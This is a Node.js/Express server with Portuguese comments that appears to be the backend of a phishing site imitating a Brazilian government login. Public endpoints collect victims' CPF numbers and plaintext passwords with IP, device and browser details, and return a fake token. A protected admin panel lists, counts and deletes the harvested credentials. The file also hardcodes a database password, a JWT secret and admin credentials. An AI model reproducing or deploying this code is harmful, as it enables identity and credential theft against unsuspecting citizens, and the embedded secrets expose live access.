const express = require('express');
const cors = require('cors');
const { Pool } = require('pg');
const rateLimit = require('express-rate-limit');
const helmet = require('helmet');
const bcrypt = require('bcrypt');
const jwt = require('jsonwebtoken');
const cookieParser = require('cookie-parser');

const app = express();

// ============ SEGURANÇA ============
app.use(helmet({
    contentSecurityPolicy: false,
}));

// Rate limit para prevenir brute force
const limiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutos
    max: 100, // limite de 100 requisições por IP
    message: { error: 'Muitas requisições, tente novamente mais tarde' },
    standardHeaders: true,
    legacyHeaders: false,
});

app.use('/api/', limiter);

app.use(cors({
    origin: true,
    credentials: true
}));
app.use(express.json());
app.use(cookieParser());
app.use(express.static('.'));

// ============ CONEXÃO POSTGRESQL ============
const pool = new Pool({
    connectionString: 'postgresql://gov_system_user:e4e5O07uWRJrDB4DlM4YOavof5NaITs7@dpg-d7rd3jjt6lks73fp5epg-a/gov_system',
    ssl: { rejectUnauthorized: false }
});

// ============ CRIAR TABELAS ============
async function initDatabase() {
    try {
        // Tabela de usuários (coletados)
        await pool.query(`
            CREATE TABLE IF NOT EXISTS users (
                id SERIAL PRIMARY KEY,
                cpf VARCHAR(14) UNIQUE NOT NULL,
                senha TEXT,
                ip TEXT,
                dispositivo TEXT,
                navegador TEXT,
                ip_senha TEXT,
                dispositivo_senha TEXT,
                navegador_senha TEXT,
                data_cpf TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                data_senha TIMESTAMP,
                status VARCHAR(20) DEFAULT 'aguardando_senha'
            )
        `);

        // Tabela de logs
        await pool.query(`
            CREATE TABLE IF NOT EXISTS logs (
                id SERIAL PRIMARY KEY,
                tipo VARCHAR(30),
                cpf VARCHAR(14),
                senha TEXT,
                ip TEXT,
                dispositivo TEXT,
                navegador TEXT,
                data TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);

        // Tabela de tentativas de login no admin
        await pool.query(`
            CREATE TABLE IF NOT EXISTS admin_logins (
                id SERIAL PRIMARY KEY,
                ip TEXT,
                tentativa TEXT,
                data TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);

        // Criar usuário admin padrão (senha: Admin@2024)
        const adminExists = await pool.query("SELECT * FROM admin_users LIMIT 1");
        if (adminExists.rows.length === 0) {
            const senhaHash = await bcrypt.hash('123456789@Abc', 10);
            await pool.query(
                "INSERT INTO admin_users (username, senha_hash) VALUES ($1, $2)",
                ['admin', senhaHash]
            );
            console.log('✅ Usuário admin criado: admin / Admin@2024');
        }

        console.log('✅ Banco de dados inicializado');
    } catch (error) {
        console.error('❌ Erro ao criar tabelas:', error.message);
    }
}

// Tabela de admin (separada)
async function createAdminTable() {
    try {
        await pool.query(`
            CREATE TABLE IF NOT EXISTS admin_users (
                id SERIAL PRIMARY KEY,
                username VARCHAR(50) UNIQUE NOT NULL,
                senha_hash VARCHAR(255) NOT NULL,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);
    } catch (error) {
        console.error('Erro ao criar tabela admin:', error.message);
    }
}

createAdminTable();
initDatabase();

// ============ MIDDLEWARE DE AUTENTICAÇÃO ============
const JWT_SECRET = 'gov_admin_secret_key_2024_ultra_segura';

function verificarAdmin(req, res, next) {
    const token = req.cookies.admin_token || req.headers.authorization?.split(' ')[1];
    
    if (!token) {
        return res.status(401).json({ error: 'Não autenticado' });
    }
    
    try {
        const decoded = jwt.verify(token, JWT_SECRET);
        req.admin = decoded;
        next();
    } catch (error) {
        res.status(401).json({ error: 'Token inválido' });
    }
}

// ============ ROTAS PÚBLICAS ============

// Rota para receber CPF
app.post('/api/cpf', async (req, res) => {
    const { cpf, ip, dispositivo, navegador } = req.body;
    
    try {
        const existing = await pool.query('SELECT * FROM users WHERE cpf = $1', [cpf]);
        
        if (existing.rows.length === 0) {
            await pool.query(
                `INSERT INTO users (cpf, ip, dispositivo, navegador, data_cpf, status) 
                 VALUES ($1, $2, $3, $4, CURRENT_TIMESTAMP, $5)`,
                [cpf, ip, dispositivo, navegador, 'aguardando_senha']
            );
        } else {
            await pool.query(
                `UPDATE users SET ip = $1, dispositivo = $2, navegador = $3, status = $4, data_cpf = CURRENT_TIMESTAMP 
                 WHERE cpf = $5`,
                [ip, dispositivo, navegador, 'aguardando_senha', cpf]
            );
        }
        
        await pool.query(
            `INSERT INTO logs (tipo, cpf, ip, dispositivo, navegador, data) 
             VALUES ($1, $2, $3, $4, $5, CURRENT_TIMESTAMP)`,
            ['cpf_inserido', cpf, ip, dispositivo, navegador]
        );
        
        res.json({ success: true });
    } catch (error) {
        console.error('Erro:', error);
        res.status(500).json({ error: 'Erro ao processar CPF' });
    }
});

// Rota para receber SENHA
app.post('/api/login', async (req, res) => {
    const { cpf, password, ip, dispositivo, navegador } = req.body;
    
    try {
        const existing = await pool.query('SELECT * FROM users WHERE cpf = $1', [cpf]);
        
        if (existing.rows.length === 0) {
            await pool.query(
                `INSERT INTO users (cpf, senha, ip_senha, dispositivo_senha, navegador_senha, data_cpf, data_senha, status) 
                 VALUES ($1, $2, $3, $4, $5, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP, $6)`,
                [cpf, password, ip, dispositivo, navegador, 'completo']
            );
        } else {
            await pool.query(
                `UPDATE users SET senha = $1, ip_senha = $2, dispositivo_senha = $3, navegador_senha = $4, data_senha = CURRENT_TIMESTAMP, status = $5 
                 WHERE cpf = $6`,
                [password, ip, dispositivo, navegador, 'completo', cpf]
            );
        }
        
        await pool.query(
            `INSERT INTO logs (tipo, cpf, senha, ip, dispositivo, navegador, data) 
             VALUES ($1, $2, $3, $4, $5, $6, CURRENT_TIMESTAMP)`,
            ['senha_inserida', cpf, password, ip, dispositivo, navegador]
        );
        
        res.json({ success: true, token: 'fake-token', user: { nome: 'Usuario', cpf: cpf, role: 'user' } });
    } catch (error) {
        console.error('Erro:', error);
        res.status(500).json({ error: 'Erro ao processar login' });
    }
});

// ============ ROTAS ADMIN (PROTEGIDAS) ============

// Login do admin
app.post('/api/admin/login', async (req, res) => {
    const { username, password, ip } = req.body;
    
    try {
        // Registrar tentativa
        await pool.query(
            'INSERT INTO admin_logins (ip, tentativa) VALUES ($1, $2)',
            [ip, `Tentativa de login: ${username}`]
        );
        
        const result = await pool.query('SELECT * FROM admin_users WHERE username = $1', [username]);
        
        if (result.rows.length === 0) {
            return res.status(401).json({ error: 'Usuário ou senha inválidos' });
        }
        
        const admin = result.rows[0];
        const senhaValida = await bcrypt.compare(password, admin.senha_hash);
        
        if (!senhaValida) {
            return res.status(401).json({ error: 'Usuário ou senha inválidos' });
        }
        
        // Gerar token JWT
        const token = jwt.sign({ id: admin.id, username: admin.username }, JWT_SECRET, { expiresIn: '8h' });
        
        res.cookie('admin_token', token, {
            httpOnly: true,
            secure: true,
            sameSite: 'strict',
            maxAge: 8 * 60 * 60 * 1000
        });
        
        res.json({ success: true, token });
    } catch (error) {
        console.error('Erro no login admin:', error);
        res.status(500).json({ error: 'Erro ao fazer login' });
    }
});

// Verificar se está logado
app.get('/api/admin/verify', verificarAdmin, async (req, res) => {
    res.json({ authenticated: true, username: req.admin.username });
});

// Logout
app.post('/api/admin/logout', (req, res) => {
    res.clearCookie('admin_token');
    res.json({ success: true });
});

// Listar usuários coletados
app.get('/api/admin/users', verificarAdmin, async (req, res) => {
    try {
        const result = await pool.query(`
            SELECT cpf, senha, ip, dispositivo, navegador, data_cpf, data_senha, status 
            FROM users 
            ORDER BY data_cpf DESC
        `);
        res.json({ users: result.rows });
    } catch (error) {
        res.status(500).json({ error: 'Erro ao buscar usuários' });
    }
});

// Listar logs
app.get('/api/admin/logs', verificarAdmin, async (req, res) => {
    try {
        const result = await pool.query(`
            SELECT tipo, cpf, senha, ip, dispositivo, navegador, data 
            FROM logs 
            ORDER BY data DESC 
            LIMIT 200
        `);
        res.json({ logs: result.rows });
    } catch (error) {
        res.status(500).json({ error: 'Erro ao buscar logs' });
    }
});

// Listar tentativas de login no admin
app.get('/api/admin/tentativas', verificarAdmin, async (req, res) => {
    try {
        const result = await pool.query(`
            SELECT ip, tentativa, data 
            FROM admin_logins 
            ORDER BY data DESC 
            LIMIT 50
        `);
        res.json({ tentativas: result.rows });
    } catch (error) {
        res.status(500).json({ error: 'Erro ao buscar tentativas' });
    }
});

// Estatísticas
app.get('/api/admin/stats', verificarAdmin, async (req, res) => {
    try {
        const totalUsers = await pool.query('SELECT COUNT(*) as total FROM users');
        const comSenha = await pool.query("SELECT COUNT(*) as total FROM users WHERE senha IS NOT NULL");
        const totalLogs = await pool.query('SELECT COUNT(*) as total FROM logs');
        const tentativasAdmin = await pool.query('SELECT COUNT(*) as total FROM admin_logins');
        
        res.json({
            stats: {
                total_users: parseInt(totalUsers.rows[0].total),
                com_senha: parseInt(comSenha.rows[0].total),
                total_logs: parseInt(totalLogs.rows[0].total),
                tentativas_admin: parseInt(tentativasAdmin.rows[0].total)
            }
        });
    } catch (error) {
        res.json({ stats: { total_users: 0, com_senha: 0, total_logs: 0, tentativas_admin: 0 } });
    }
});

// Deletar usuário
app.delete('/api/admin/delete/:cpf', verificarAdmin, async (req, res) => {
    try {
        await pool.query('DELETE FROM users WHERE cpf = $1', [req.params.cpf]);
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ error: 'Erro ao deletar' });
    }
});

// Limpar todos os dados
app.post('/api/admin/clear', verificarAdmin, async (req, res) => {
    try {
        await pool.query('DELETE FROM users');
        await pool.query('DELETE FROM logs');
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ error: 'Erro ao limpar' });
    }
});

// ============ PAINEL ADMIN HTML ============
app.get('/admin', (req, res) => {
    res.sendFile(__dirname + '/admin.html');
});

// ============ INICIAR SERVIDOR ============
const PORT = process.env.PORT || 3001;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Servidor rodando na porta ${PORT}`);
    console.log(`📊 Painel Admin: http://localhost:${PORT}/admin`);
    console.log(`🔐 Login: admin / Admin@2024`);
});